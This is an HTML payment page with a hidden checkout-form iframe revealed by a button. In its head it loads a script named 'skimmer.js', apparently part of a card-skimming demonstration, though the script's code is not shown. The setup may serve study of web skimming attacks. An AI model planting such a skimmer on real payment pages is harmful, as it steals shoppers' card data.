<!DOCTYPE html>
<html lang="en">
  
<head>
  <meta charset="UTF-8">
    <title>Payment page</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.2/css/all.css">
    <script type="text/javascript" src="skimmer.js"></script>  
</head>

<body>
  
    <iframe name="theframe" id="iframes" src="form.html" frameborder="0" width="580px" height="680px"></iframe>
    <script type="text/javascript">
      
      var iframe = document.getElementById('iframes');
      iframe.style.display = "none";
    
      function toShow() {
        var iframe = document.getElementById('iframes');
        iframe.style.display = 'block';
      }
    </script>
    <button class="btn" id="button" onclick="toShow();" target="theframe">
      checkout form
    </button> 
  <style>    
    body{
      background-color: #c7c4c4;
    }
     iframe{ 
      margin: 0 auto;
      display: block;
      }
  </style>
  <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
</body>
</html>
